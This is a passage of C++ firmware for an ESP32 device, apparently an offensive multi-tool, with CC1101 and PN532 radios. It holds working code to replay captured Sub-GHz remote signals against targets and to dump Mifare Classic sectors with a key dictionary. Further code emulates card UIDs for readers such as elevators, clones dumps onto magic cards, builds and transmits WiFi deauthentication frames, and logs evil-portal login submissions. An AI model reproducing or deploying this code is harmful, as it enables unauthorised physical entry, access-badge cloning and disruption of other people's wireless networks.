    sgActiveBwIdx = bestBw;
  }
  sgCapture.valid = true;
  sgCapture.pulseLen = sgPulseCount;
  sgWaveReady = true;
  sgLoadedFromSd = true;
  sgAwaitReplayResult = false;
  Serial.printf("[SD] Loaded Sub-GHz capture: %s edges=%d rssi=%ddBm start=%u freq=%.3fMHz bw=%.0fkHz target_class=%s\n",
                path, sgPulseCount, sgCaptureRssi, sgStartLevel,
                sgActiveFreqMHz, SG_RX_BWS[sgActiveBwIdx], sgTargetClass);
  triggerReaction(MOOD_SUCCESS, "Loaded", "Sub-GHz file");
  return true;
}

bool loadLatestSubGhzCapture() {
  if (!sdAvailable) {
    triggerReaction(MOOD_FAIL, "No SD", "cannot load");
    return false;
  }
  File root = SD.open(SG_CAPTURE_DIR);
  if (!root || !root.isDirectory()) {
    triggerReaction(MOOD_FAIL, "No captures", "subghz dir");
    return false;
  }

  char bestPath[80] = {0};
  unsigned long bestStamp = 0;
  File entry = root.openNextFile();
  while (entry) {
    if (!entry.isDirectory()) {
      const char* p = entry.path();
      const char* slash = strrchr(p, '/');
      const char* name = slash ? slash + 1 : p;
      unsigned long stamp = strtoul(name, nullptr, 10);
      if (stamp >= bestStamp && strstr(name, "kHz.json") && !strstr(name, "_replay") && !strstr(name, "_rolling_sim")) {
        bestStamp = stamp;
        snprintf(bestPath, sizeof(bestPath), "%s", p);
      }
    }
    entry.close();
    entry = root.openNextFile();
  }
  root.close();

  if (!bestPath[0]) {
    triggerReaction(MOOD_FAIL, "No captures", "save one first");
    return false;
  }
  return loadSubGhzCaptureFile(bestPath);
}

void enterSubGhzPicker() {
  sgPickerCount = 0;
  sgPickerIdx = 0;
  sgPickerScroll = 0;

  if (!sdAvailable) {
    triggerReaction(MOOD_FAIL, "No SD", "cannot browse");
    return;
  }
  File root = SD.open(SG_CAPTURE_DIR);
  if (!root || !root.isDirectory()) {
    triggerReaction(MOOD_FAIL, "No captures", "subghz dir");
    return;
  }

  File entry = root.openNextFile();
  while (entry && sgPickerCount < SG_PICKER_MAX) {
    if (!entry.isDirectory()) {
      const char* p = entry.path();
      const char* slash = strrchr(p, '/');
      const char* name = slash ? slash + 1 : p;
      if (strstr(name, "kHz.json") && !strstr(name, "_replay") && !strstr(name, "_rolling_sim")) {
        snprintf(sgPickerPaths[sgPickerCount], sizeof(sgPickerPaths[0]), "%s", p);
        snprintf(sgPickerNames[sgPickerCount], sizeof(sgPickerNames[0]), "%s", name);
        sgPickerCount++;
      }
    }
    entry.close();
    entry = root.openNextFile();
  }
  root.close();

  if (sgPickerCount <= 0) {
    triggerReaction(MOOD_FAIL, "No captures", "save one first");
    return;
  }

  currentState = STATE_SUBGHZ_PICKER;
  Serial.printf("[CC1101] picker loaded %d capture(s)\n", sgPickerCount);
  triggerReaction(MOOD_THINKING, "Pick capture", "up/dn ok");
}

void delayMicrosecondsChunked(uint16_t us) {
  while (us > 12000) {
    delayMicroseconds(12000);
    us -= 12000;
  }
  if (us > 0) delayMicroseconds(us);
}

void replaySubGhzCapture() {
  if (!cc1101Ok || !sgCapture.valid || sgPulseCount <= 0) {
    triggerReaction(MOOD_FAIL, "No signal", "capture first");
    return;
  }

  Serial.printf("[CC1101] replay start edges=%d start=%u source=%s target_class=%s freq=%.2fMHz repeats=5 gap_ms=12\n",
                sgPulseCount, sgStartLevel, sgLoadedFromSd ? "sd" : "live", sgTargetClass, sgActiveFreqMHz);
  char freqStr[16]; snprintf(freqStr, sizeof(freqStr), "%.2fMHz", sgActiveFreqMHz);
  triggerReaction(MOOD_ANGRY, "Replay TX", freqStr);

  sgListening = false;
  sgArmed = false;

  // Align to frame boundary: find first sync gap (≥5000 µs) so replay always
  // starts at the beginning of a clean frame, not mid-frame.
  int replayStart = 0;
  for (int i = 0; i < sgPulseCount; i++) {
    if (sgEdgesUs[i] >= 5000) { replayStart = i + 1; break; }
  }
  // Level after sync gap: the sync gap edge itself is a long-LOW; the next edge
  // is always HIGH (Princeton preamble begins with a short-HIGH pulse).
  // If no sync gap found, fall back to recorded start_level.
  uint8_t replayStartLevel = (replayStart > 0) ? HIGH : (sgStartLevel ? HIGH : LOW);
  int replayLen = sgPulseCount - replayStart;
  if (replayLen < 20) { replayStart = 0; replayStartLevel = sgStartLevel ? HIGH : LOW; replayLen = sgPulseCount; }

  ELECHOUSE_cc1101.setMHZ(sgActiveFreqMHz);
  ELECHOUSE_cc1101.setCCMode(0);      // async serial mode
  ELECHOUSE_cc1101.setModulation(2);  // ASK/OOK — also writes correct OOK PA_TABLE via setPA(12)
  ELECHOUSE_cc1101.setDRate(3.79372f);
  ELECHOUSE_cc1101.setDeviation(0.0f);
  // Set IOCFG0=0x2E before taking GDO0 as output so CC1101 does not also
  // drive GDO0 during async TX (IOCFG0=0x0D left by setCCMode(0) would cause
  // bus contention and corrupt the OOK waveform).
  ELECHOUSE_cc1101.SpiWriteReg(CC1101_IOCFG0, 0x2E);
  ELECHOUSE_cc1101.SetTx();
  pinMode(4, OUTPUT);
  digitalWrite(4, LOW);
  delayMicroseconds(500);  // settle before first edge

  for (int repeat = 0; repeat < 6; repeat++) {
    uint8_t level = replayStartLevel;
    for (int i = 0; i < replayLen; i++) {
      digitalWrite(4, level);
      delayMicrosecondsChunked(sgEdgesUs[replayStart + i]);
      level = !level;
    }
    digitalWrite(4, LOW);
    delay(10);
  }

  // Restore IOCFG0 before returning to RX mode
  ELECHOUSE_cc1101.SpiWriteReg(CC1101_IOCFG0, 0x0D);
  pinMode(4, INPUT);
  configureSubGhzRawRx(sgActiveFreqMHz, false);
  sgListening = true;
  sgAwaitReplayResult = true;
  Serial.println("[CC1101] replay done; operator result: w=opened/accepted i=interaction_no_unlock s=no_response");
  triggerReaction(MOOD_SUCCESS, "Replay sent", "test target");
}

void saveNfcCapture() {
  if (!sdAvailable || !nfcCard.valid) {
    if (!sdAvailable) Serial.println("[SD] NFC capture not saved (no card)");
    return;
  }

  String payload;
  payload.reserve(128);
  payload += nfcCard.uid;
  payload += "|";
  payload += nfcCard.type;
  payload += "|";
  payload += nfcCard.network;
  payload += "|";
  payload += nfcCard.aid;
  payload += "|";
  payload += nfcCard.panMasked;
  payload += "|";
  payload += nfcCard.expiry;
  payload += "|";
  payload += nfcCard.holder;

  char hash[41] = {0};
  sha1Hex(payload, hash, sizeof(hash));

  char safeUid[22];
  snprintf(safeUid, sizeof(safeUid), "%s", nfcCard.uid);
  for (size_t i = 0; i < strlen(safeUid); i++) if (safeUid[i] == ':') safeUid[i] = '-';

  char path[80];
  snprintf(path, sizeof(path), "%s/%lu_%s.json", NFC_CAPTURE_DIR, millis(), safeUid);
  File f = SD.open(path, FILE_WRITE);
  if (!f) {
    Serial.printf("[SD] Cannot write %s\n", path);
    return;
  }

  f.println("{");
  f.println("  \"schema\": 1,");
  f.printf("  \"captured_at\": \"uptime-ms-%lu\",\n", millis());
  f.printf("  \"elapsed_ms\": %lu,\n", nfcScanElapsedMs);
  f.println("  \"hardware\": {");
  f.println("    \"mcu\": \"ESP32-WROOM-32D\",");
  f.println("    \"reader\": \"PN532\",");
  f.println("    \"bus\": \"I2C\",");
  f.println("    \"address\": \"0x24\"");
  f.println("  },");
  f.printf("  \"type\": \"%s\",\n", nfcCard.type);
  f.printf("  \"uid\": \"%s\",\n", nfcCard.uid);
  f.printf("  \"sak\": \"0x%02X\",\n", nfcCard.sak);
  f.println("  \"atqa\": null,");
  f.println("  \"emv\": {");
  if (strlen(nfcCard.aid)) f.printf("    \"aid\": \"%s\",\n", nfcCard.aid);
  else f.println("    \"aid\": null,");
  if (strlen(nfcCard.panMasked)) f.printf("    \"pan_masked\": \"%s\",\n", nfcCard.panMasked);
  else f.println("    \"pan_masked\": null,");
  if (strlen(nfcCard.expiry)) f.printf("    \"expiry\": \"%s\",\n", nfcCard.expiry);
  else f.println("    \"expiry\": null,");
  if (strlen(nfcCard.holder)) f.printf("    \"name\": \"%s\",\n", nfcCard.holder);
  else f.println("    \"name\": null,");
  f.printf("    \"limit_stage\": \"%s\",\n", nfcLimitStage);
  f.printf("    \"ppse_ok\": %s,\n", nfcSawPpse ? "true" : "false");
  f.printf("    \"aid_select_ok\": %s,\n", nfcSawAidSelect ? "true" : "false");
  f.printf("    \"gpo_ok\": %s,\n", nfcSawGpo ? "true" : "false");
  f.printf("    \"record_read_ok\": %s,\n", nfcSawRecord ? "true" : "false");
  f.println("    \"payment_emulation\": \"blocked_no_dynamic_cryptogram_no_terminal_relay\",");
  f.println("    \"verdict\": \"metadata_read_only_payment_emulation_not_possible_on_this_stack\"");
  f.println("  },");
  f.printf("  \"sha1\": \"%s\"\n", hash);
  f.println("}");
  f.close();
  Serial.printf("[SD] NFC saved: %s\n", path);
}

void printNfcLimitSimulation() {
  Serial.println("[NFC-SIM] payment emulation boundary report");
  Serial.printf("[NFC-SIM] stage=%s elapsed=%lums hw=ESP32-WROOM-32D+PN532/I2C ppse=%s aid=%s gpo=%s records=%s pan=%s expiry=%s\n",
                nfcLimitStage,
                nfcScanElapsedMs,
                nfcSawPpse ? "ok" : "no",
                nfcSawAidSelect ? "ok" : "no",
                nfcSawGpo ? "ok" : "no",
                nfcSawRecord ? "ok" : "no",
                strlen(nfcCard.panMasked) ? "masked-present" : "missing",
                strlen(nfcCard.expiry) ? nfcCard.expiry : "missing");
  Serial.println("[NFC-SIM] blocked: passive read has no issuer key, ATC state control, unpredictable terminal data, or valid Application Cryptogram");
  Serial.println("[NFC-SIM] safe demo output: masked metadata + exact APDU stop point; no payment relay/emulation attempted");
}

// ============================================================
// MIFARE CLASSIC — READ / SAVE / EMULATE / WRITE
// Implements PRD §9.2 access card sub-features (F2 extension)
// ============================================================

// Attempt Mifare Classic sector dump using built-in key dictionary.
// Returns true if card detected (even UID-only with 0 sectors).
bool nfcReadMifare(NfcMifareCard& mc) {
  memset(&mc, 0, sizeof(mc));
  mc.valid = false;

  Wire.beginTransmission(0x24);
  if (Wire.endTransmission() != 0) {
    snprintf(mifareStatus, sizeof(mifareStatus), "PN532 off bus");
    return false;
  }

  uint8_t uid[7]; uint8_t uidLen = 0;
  if (!nfc532.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLen, 200)) {
    snprintf(mifareStatus, sizeof(mifareStatus), "No card");
    return false;
  }

  mc.uidLen = uidLen;
  memcpy(mc.uidRaw, uid, uidLen);
  {
    char* p = mc.uid;
    for (uint8_t i = 0; i < uidLen; i++)
      p += (i ? snprintf(p, 4, ":%02X", uid[i]) : snprintf(p, 3, "%02X", uid[i]));
  }
  mc.sak   = nfc532.getLastPassiveTargetSak();
  mc.valid = true;

  if (uidLen != 4) {
    mc.sectorsRead = 0;
    snprintf(mifareStatus, sizeof(mifareStatus), "UID-only (len=%u)", uidLen);
    return true;
  }

  snprintf(mifareStatus, sizeof(mifareStatus), "Dumping...");
  mc.sectorsRead = 0;
  bool cardActive = true;

  for (uint8_t sector = 0; sector < MIFARE_SECTOR_COUNT; sector++) {
    uint8_t trailer = sector * 4 + 3;
    bool unlocked = false;

    for (int ki = 0; ki < MIFARE_KEY_DICT_SIZE && !unlocked; ki++) {
      for (int kt = 0; kt < 2 && !unlocked; kt++) {
        if (!cardActive) {
          if (!nfc532.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLen, 100)) {
            snprintf(mifareStatus, sizeof(mifareStatus), "Card lost s%u", sector);
            return mc.sectorsRead > 0;
          }
          cardActive = true;
        }
        bool ok = nfc532.mifareclassic_AuthenticateBlock(
            uid, uidLen, trailer, kt, (uint8_t*)mifareKeyDict[ki]);
        if (ok) {
          unlocked = true;
          memcpy(mc.sectorKeyUsed[sector], mifareKeyDict[ki], 6);
          mc.sectorKeyIsB[sector] = (kt == 1);
          bool allBlocksRead = true;
          for (uint8_t b = 0; b < 4; b++) {
            uint8_t blockNum = sector * 4 + b;
            if (!nfc532.mifareclassic_ReadDataBlock(blockNum, mc.blocks[blockNum])) {
              memset(mc.blocks[blockNum], 0, 16);
              allBlocksRead = false;
              Serial.printf("[MIFARE] s%u b%u read fail\n", sector, b);
            }
          }
          if (allBlocksRead) {
            mc.sectorUnlocked[sector] = true;
            mc.sectorsRead++;
            Serial.printf("[MIFARE] s%u ok ki=%d %s\n", sector, ki, kt ? "B" : "A");
          } else {
            Serial.printf("[MIFARE] s%u auth ok but dump incomplete\n", sector);
          }
        } else {
          cardActive = false;
          delay(5);
        }
      }
    }
    if (!unlocked) Serial.printf("[MIFARE] s%u locked\n", sector);
  }

  snprintf(mifareStatus, sizeof(mifareStatus), "%d/%d sectors", mc.sectorsRead, MIFARE_SECTOR_COUNT);
  return true;
}

// Save Mifare dump to SD as JSON + raw binary sidecar for reload.
void nfcSaveMifare(const NfcMifareCard& mc) {
  if (!sdAvailable || !mc.valid) return;

  char safeUid[20];
  strncpy(safeUid, mc.uid, sizeof(safeUid) - 1);
  safeUid[sizeof(safeUid)-1] = '\0';
  for (char* p = safeUid; *p; p++) if (*p == ':') *p = '-';

  // JSON (human-readable / schema §11.2 extension)
  char jpath[56];
  snprintf(jpath, sizeof(jpath), "%s/%lu_%s_mfc.json", NFC_CAPTURE_DIR, millis(), safeUid);
  File jf = SD.open(jpath, FILE_WRITE);
  if (jf) {
    jf.println("{");
    jf.printf("  \"schema\": 1,\n");
    jf.printf("  \"captured_at\": \"uptime-ms-%lu\",\n", millis());
    jf.printf("  \"type\": \"mifare_classic_1k\",\n");
    jf.printf("  \"uid\": \"%s\",\n", mc.uid);
    jf.printf("  \"uid_len\": %u,\n", mc.uidLen);
    jf.printf("  \"sak\": \"0x%02X\",\n", mc.sak);
    jf.printf("  \"sectors_read\": %d,\n", mc.sectorsRead);
    jf.println("  \"sectors\": [");
    bool first = true;
    for (int s = 0; s < MIFARE_SECTOR_COUNT; s++) {
      if (!mc.sectorUnlocked[s]) continue;
      if (!first) jf.println(",");
      first = false;
      jf.printf("    {\"sector\":%d,\"key\":\"%02X%02X%02X%02X%02X%02X\","
                "\"key_type\":\"%s\",\"blocks\":[",
                s,
                mc.sectorKeyUsed[s][0], mc.sectorKeyUsed[s][1],
                mc.sectorKeyUsed[s][2], mc.sectorKeyUsed[s][3],
                mc.sectorKeyUsed[s][4], mc.sectorKeyUsed[s][5],
                mc.sectorKeyIsB[s] ? "B" : "A");
      for (int b = 0; b < 4; b++) {
        jf.print(b ? ",\"" : "\"");
        for (int i = 0; i < 16; i++) jf.printf("%02X", mc.blocks[s*4+b][i]);
        jf.print("\"");
      }
      jf.print("]}");
    }
    jf.println("\n  ]\n}");
    jf.close();
  }

  // Binary sidecar — raw NfcMifareCard struct for fast reload
  char bpath[56];
  snprintf(bpath, sizeof(bpath), "%s/%lu_%s_mfc.bin", NFC_CAPTURE_DIR, millis()+1, safeUid);
  File bf = SD.open(bpath, FILE_WRITE);
  if (bf) { bf.write((const uint8_t*)&mc, sizeof(mc)); bf.close(); }

  Serial.printf("[SD] Mifare saved: %s\n", jpath);
  triggerReaction(MOOD_SUCCESS, "Card saved", mc.uid);
}

// Load saved Mifare binary back into dest struct.
bool nfcLoadMifare(const char* binPath, NfcMifareCard& dest) {
  File f = SD.open(binPath);
  if (!f || f.size() != sizeof(NfcMifareCard)) { if (f) f.close(); return false; }
  f.read((uint8_t*)&dest, sizeof(NfcMifareCard));
  f.close();
  return dest.valid;
}

// Populate saved list from SD (binary sidecars only).
void nfcLoadSavedList() {
  nfcSavedCount = 0;
  if (!sdAvailable) return;
  File dir = SD.open(NFC_CAPTURE_DIR);
  if (!dir) return;
  while (nfcSavedCount < NFC_SAVED_MAX) {
    File entry = dir.openNextFile();
    if (!entry) break;
    const char* entryPath = entry.path();
    const char* rawName = entry.name();
    const char* name = strrchr(rawName, '/');
    name = name ? name + 1 : rawName;
    if (strstr(name, "_mfc.bin")) {
      if (entryPath && entryPath[0] == '/')
        snprintf(nfcSavedPaths[nfcSavedCount], 56, "%s", entryPath);
      else
        snprintf(nfcSavedPaths[nfcSavedCount], 56, "%s/%s", NFC_CAPTURE_DIR, name);
      // Label: extract UID-like part between first _ and _mfc
      const char* us = strchr(name, '_');
      const char* ue = strstr(name, "_mfc");
      if (us && ue && ue > us+1) {
        size_t l = min((size_t)(ue - us - 1), (size_t)19);
        strncpy(nfcSavedLabels[nfcSavedCount], us+1, l);
        nfcSavedLabels[nfcSavedCount][l] = '\0';
      } else {
        strncpy(nfcSavedLabels[nfcSavedCount], name, 19);
        nfcSavedLabels[nfcSavedCount][19] = '\0';
      }
      nfcSavedCount++;
    }
    entry.close();
  }
  dir.close();
}

// PN532 card emulation. Uses lib/PN532Custom/ AsTargetUID() — caller-supplied UID.
// Returns true when an external reader has selected the emulated card.
// Caveat: only first 3 UID bytes are emulated; 4th = BCC = uid[0]^uid[1]^uid[2].
// Most cheap UID-only readers don't validate uid[3] strictly → works for elevators.
// Sector-auth readers reject — fall back to magic card write path.
bool nfcEmulateStep(const NfcMifareCard& src) {
  if (!src.valid || src.uidLen != 4) return false;
  uint8_t sak = src.sak ? src.sak : 0x08;
  return nfc532.AsTargetUID(src.uidRaw, sak) == 1;
}

// Write a dumped Mifare card onto a magic (CUID) blank card placed on the reader.
// Returns true only when every dumped block is written.
bool nfcWriteToMagicCard(const NfcMifareCard& src) {
  if (!src.valid || src.uidLen != 4) {
    snprintf(nfcWriteStatus, sizeof(nfcWriteStatus), "Invalid source");
    return false;
  }
  uint8_t uid[7]; uint8_t uidLen = 0;
  snprintf(nfcWriteStatus, sizeof(nfcWriteStatus), "Present blank card");
  if (!nfc532.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLen, 3000) || uidLen != 4) {
    snprintf(nfcWriteStatus, sizeof(nfcWriteStatus), "No target card");
    return false;
  }

  snprintf(nfcWriteStatus, sizeof(nfcWriteStatus), "Writing...");
  int written = 0;
  int expected = 0;
  bool cardActive = true;
  uint8_t blankKey[] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

  for (uint8_t sector = 0; sector < MIFARE_SECTOR_COUNT; sector++) {
    if (!src.sectorUnlocked[sector]) continue;
    expected += 4;

    if (!cardActive) {
      if (!nfc532.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLen, 500)) {
        snprintf(nfcWriteStatus, sizeof(nfcWriteStatus), "Card lost s%u", sector);
        return false;
      }
      cardActive = true;
    }

    if (!nfc532.mifareclassic_AuthenticateBlock(uid, uidLen, sector*4+3, 0, blankKey)) {
      cardActive = false;
      Serial.printf("[MIFARE-WRITE] s%u auth fail on target\n", sector);
      continue;
    }

    for (uint8_t b = 0; b < 4; b++) {
      uint8_t blockNum = sector * 4 + b;
      uint8_t data[16];
      memcpy(data, src.blocks[blockNum], 16);
      // Restore Key A in sector trailer from the key we used during dump
      if (b == 3 && !src.sectorKeyIsB[sector])
        memcpy(data, src.sectorKeyUsed[sector], 6);
      if (nfc532.mifareclassic_WriteDataBlock(blockNum, data)) written++;
      else Serial.printf("[MIFARE-WRITE] block %u fail\n", blockNum);
    }
  }

  if (expected > 0 && written == expected)
    snprintf(nfcWriteStatus, sizeof(nfcWriteStatus), "%d blk written", written);
  else if (written > 0)
    snprintf(nfcWriteStatus, sizeof(nfcWriteStatus), "Partial %d/%d blk", written, expected);
  else
    snprintf(nfcWriteStatus, sizeof(nfcWriteStatus), "Write failed");
  return expected > 0 && written == expected;
}

void maskSecret(const char* in, char* out, size_t outSize) {
  if (!outSize) return;
  size_t len = strlen(in);
  size_t n = min(len, outSize - 1);
  for (size_t i = 0; i < n; i++) out[i] = '*';
  out[n] = '\0';
}

void sanitizeLogField(const char* in, char* out, size_t outSize) {
  if (!outSize) return;
  size_t j = 0;
  for (size_t i = 0; in[i] && j < outSize - 1; i++) {
    char c = in[i];
    if (c == '"' || c == '\\' || c == '\n' || c == '\r') c = '_';
    out[j++] = c;
  }
  out[j] = '\0';
}

int portalThemeTotal() {
  return portalThemeCount + sdPortalThemeCount;
}

bool portalThemeIsSd(int idx) {
  return idx >= portalThemeCount && idx < portalThemeTotal();
}

const char* portalThemeName(int idx) {
  if (idx < portalThemeCount) return portalThemes[idx].name;
  int sdIdx = idx - portalThemeCount;
  if (sdIdx >= 0 && sdIdx < sdPortalThemeCount) return sdPortalThemeNames[sdIdx];
  return "Network Access";
}

const char* portalThemePath(int idx) {
  int sdIdx = idx - portalThemeCount;
  if (sdIdx >= 0 && sdIdx < sdPortalThemeCount) return sdPortalThemePaths[sdIdx];
  return "";
}

void loadSdPortalThemes() {
  sdPortalThemeCount = 0;
  if (!sdAvailable || !SD.exists("/portal-themes")) return;
  File root = SD.open("/portal-themes");
  if (!root || !root.isDirectory()) return;

  File entry = root.openNextFile();
  while (entry && sdPortalThemeCount < maxSdPortalThemes) {
    if (entry.isDirectory()) {
      char path[64];
      snprintf(path, sizeof(path), "%s", entry.path());
      char indexPath[80];
      snprintf(indexPath, sizeof(indexPath), "%s/index.html", path);
      if (SD.exists(indexPath)) {
        const char* slash = strrchr(path, '/');
        const char* name = slash ? slash + 1 : path;
        snprintf(sdPortalThemeNames[sdPortalThemeCount], sizeof(sdPortalThemeNames[0]), "%s", name);
        snprintf(sdPortalThemePaths[sdPortalThemeCount], sizeof(sdPortalThemePaths[0]), "%s", path);
        sdPortalThemeCount++;
      }
    }
    entry.close();
    entry = root.openNextFile();
  }
  root.close();
  Serial.printf("[PORTAL] SD themes loaded=%d\n", sdPortalThemeCount);
}

void saveWifiScanCapture() {
  if (!sdAvailable) { Serial.println("[SD] WiFi scan not saved (no card)"); return; }

  String payload;
  payload.reserve(512);
  payload += "wifi-scan|";
  payload += wifiCount;
  for (int i = 0; i < wifiCount; i++) {
    char bssid[18];
    macToString(wifiNets[i].bssid, bssid, sizeof(bssid));
    payload += "|";
    payload += bssid;
    payload += ",";
    payload += wifiNets[i].channel;
    payload += ",";
    payload += wifiNets[i].rssi;
  }
  char hash[41] = {0};
  sha1Hex(payload, hash, sizeof(hash));

  char path[64];
  snprintf(path, sizeof(path), "%s/%lu_ap_scan.json", WIFI_CAPTURE_DIR, millis());
  File f = SD.open(path, FILE_WRITE);
  if (!f) { Serial.printf("[SD] Cannot write %s\n", path); return; }

  f.println("{");
  f.println("  \"schema\": 1,");
  f.println("  \"type\": \"wifi_ap_scan\",");
  f.printf("  \"captured_at\": \"uptime-ms-%lu\",\n", millis());
  f.printf("  \"count\": %d,\n", wifiCount);
  f.println("  \"aps\": [");
  for (int i = 0; i < wifiCount; i++) {
    char bssid[18];
    macToString(wifiNets[i].bssid, bssid, sizeof(bssid));
    f.printf("    {\"ssid\":\"%s\",\"bssid\":\"%s\",\"rssi_dbm\":%d,\"channel\":%d,\"encryption\":%d}%s\n",
             wifiNets[i].ssid.c_str(), bssid, wifiNets[i].rssi,
             wifiNets[i].channel, wifiNets[i].encryption,
             (i == wifiCount - 1) ? "" : ",");
  }
  f.println("  ],");
  f.printf("  \"sha1\": \"%s\"\n", hash);
  f.println("}");
  f.close();
  Serial.printf("[SD] WiFi scan saved: %s\n", path);
}

void saveWifiClientScanCapture() {
  if (!sdAvailable) { Serial.println("[SD] WiFi clients not saved (no card)"); return; }

  char bssid[18];
  macToString(wifiNets[deauthTargetIdx].bssid, bssid, sizeof(bssid));
  String payload;
  payload.reserve(256);
  payload += "wifi-clients|";
  payload += bssid;
  payload += "|";
  payload += clientCount;
  for (int i = 0; i < clientCount; i++) {
    char mac[18];
    macToString(clients[i].mac, mac, sizeof(mac));
    payload += "|";
    payload += mac;
  }
  char hash[41] = {0};
  sha1Hex(payload, hash, sizeof(hash));

  char path[72];
  snprintf(path, sizeof(path), "%s/%lu_clients.json", WIFI_CAPTURE_DIR, millis());
  File f = SD.open(path, FILE_WRITE);
  if (!f) { Serial.printf("[SD] Cannot write %s\n", path); return; }

  f.println("{");
  f.println("  \"schema\": 1,");
  f.println("  \"type\": \"wifi_client_scan\",");
  f.printf("  \"captured_at\": \"uptime-ms-%lu\",\n", millis());
  f.printf("  \"target_ssid\": \"%s\",\n", wifiNets[deauthTargetIdx].ssid.c_str());
  f.printf("  \"target_bssid\": \"%s\",\n", bssid);
  f.printf("  \"channel\": %d,\n", wifiNets[deauthTargetIdx].channel);
  f.printf("  \"count\": %d,\n", clientCount);
  f.println("  \"clients\": [");
  for (int i = 0; i < clientCount; i++) {
    char mac[18];
    macToString(clients[i].mac, mac, sizeof(mac));
    f.printf("    {\"mac\":\"%s\"}%s\n", mac, (i == clientCount - 1) ? "" : ",");
  }
  f.println("  ],");
  f.printf("  \"sha1\": \"%s\"\n", hash);
  f.println("}");
  f.close();
  Serial.printf("[SD] WiFi clients saved: %s\n", path);
}

void saveWifiDeauthSession() {
  if (!sdAvailable) { Serial.println("[SD] Deauth session not saved (no card)"); return; }

  char bssid[18];
  macToString(wifiNets[deauthTargetIdx].bssid, bssid, sizeof(bssid));
  char target[18] = "broadcast";
  if (attackMode == DEAUTH_MODE_ALL_DISCOVERED) snprintf(target, sizeof(target), "all-discovered");
  if (attackMode == DEAUTH_MODE_SINGLE) macToString(attackClientMAC, target, sizeof(target));

  String payload;
  payload.reserve(160);
  payload += "deauth|";
  payload += bssid;
  payload += "|";
  payload += target;
  payload += "|";
  payload += deauthFrameCount;
  char hash[41] = {0};
  sha1Hex(payload, hash, sizeof(hash));

  char path[72];
  snprintf(path, sizeof(path), "%s/%lu_deauth.json", WIFI_CAPTURE_DIR, millis());
  File f = SD.open(path, FILE_WRITE);
  if (!f) { Serial.printf("[SD] Cannot write %s\n", path); return; }

  f.println("{");
  f.println("  \"schema\": 1,");
  f.println("  \"type\": \"wifi_deauth_session\",");
  f.printf("  \"captured_at\": \"uptime-ms-%lu\",\n", millis());
  f.printf("  \"target_ssid\": \"%s\",\n", wifiNets[deauthTargetIdx].ssid.c_str());
  f.printf("  \"target_bssid\": \"%s\",\n", bssid);
  f.printf("  \"channel\": %d,\n", wifiNets[deauthTargetIdx].channel);
  f.printf("  \"mode\": \"%s\",\n", deauthModeName(attackMode));
  f.printf("  \"target\": \"%s\",\n", target);
  f.printf("  \"frames_sent\": %d,\n", deauthFrameCount);
  f.printf("  \"tx_ok\": %d,\n", deauthTxOk);
  f.printf("  \"tx_fail\": %d,\n", deauthTxFail);
  f.printf("  \"sha1\": \"%s\"\n", hash);
  f.println("}");
  f.close();
  Serial.printf("[SD] Deauth session saved: %s\n", path);
}

void saveWifiPortalEvent(const char* user, const char* pass) {
  if (!sdAvailable) return;

  char maskedPass[33];
  char safeUser[33];
  maskSecret(pass, maskedPass, sizeof(maskedPass));
  sanitizeLogField(user, safeUser, sizeof(safeUser));
  String payload;
  payload.reserve(96);
  payload += "portal|";
  payload += safeUser;
  payload += "|";
  payload += maskedPass;
  char hash[41] = {0};
  sha1Hex(payload, hash, sizeof(hash));

  char path[72];
  snprintf(path, sizeof(path), "%s/%lu_portal.json", WIFI_CAPTURE_DIR, millis());
  File f = SD.open(path, FILE_WRITE);
  if (!f) { Serial.printf("[SD] Cannot write %s\n", path); return; }

  f.println("{");
  f.println("  \"schema\": 1,");
  f.println("  \"type\": \"wifi_portal_submission\",");
  f.printf("  \"captured_at\": \"uptime-ms-%lu\",\n", millis());
  f.printf("  \"user\": \"%s\",\n", safeUser);
  f.printf("  \"pass_masked\": \"%s\",\n", maskedPass);
  f.printf("  \"sha1\": \"%s\"\n", hash);
  f.println("}");
  f.close();
  Serial.printf("[SD] Portal event saved: %s\n", path);
}

// ============================================================
// BEACON HELPERS
// ============================================================

void generateSpamMACs() {
  for (int i = 0; i < spamSSIDCount; i++) {
    spamMACs[i][0]=0x02|(i&0xFC); spamMACs[i][1]=0x13+i;
    spamMACs[i][2]=0xAB-i;        spamMACs[i][3]=0x45+(i*7);
    spamMACs[i][4]=0xCD^i;        spamMACs[i][5]=0xEF+(i*3);
  }
}

// ============================================================
// DEAUTH FRAME
// ============================================================

uint8_t deauthFrame[26] = {
  0xC0,0x00,0x3A,0x01,
  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
  0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,
  0xF0,0xFF,0x07,0x00
};

esp_err_t sendMgmtFrame(uint8_t subtype, const uint8_t* addr1, const uint8_t* addr2, const uint8_t* addr3, uint16_t reason) {
  static uint16_t seqNum = 0;
  seqNum = (seqNum + 1) & 0x0FFF;
  uint16_t seqCtrl = seqNum << 4;
  deauthFrame[0] = subtype;
  deauthFrame[1] = 0x00;
  deauthFrame[2] = 0x3A;
  deauthFrame[3] = 0x01;
  memcpy(&deauthFrame[4],  addr1, 6);
  memcpy(&deauthFrame[10], addr2, 6);
  memcpy(&deauthFrame[16], addr3, 6);
  deauthFrame[22] = seqCtrl & 0xFF;
  deauthFrame[23] = (seqCtrl >> 8) & 0xFF;
  deauthFrame[24] = reason & 0xFF;
  deauthFrame[25] = (reason >> 8) & 0xFF;
  wifi_interface_t iface = etActive ? WIFI_IF_AP : WIFI_IF_STA;
  esp_err_t r = esp_wifi_80211_tx(iface, deauthFrame, sizeof(deauthFrame), true);
  if (r != ESP_OK && etActive) {
    r = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), true);
  }
  if (r == ESP_OK) {
    deauthTxOk++;
  } else {
    deauthTxFail++;
    deauthLastTxErr = r;
    if (deauthTxErrLogCount < 8) {
      Serial.printf("[DEAUTH] tx fail subtype=0x%02X if=%s err=%d %s\n",
                    subtype, etActive ? "AP" : "STA", r, esp_err_to_name(r));
      deauthTxErrLogCount++;
    }
  }
  return r;
}

void sendDeauthFrame(const uint8_t* apBSSID, const uint8_t* destMAC) {
  sendMgmtFrame(0xC0, destMAC, apBSSID, apBSSID, 7);
  sendMgmtFrame(0xA0, destMAC, apBSSID, apBSSID, 8);
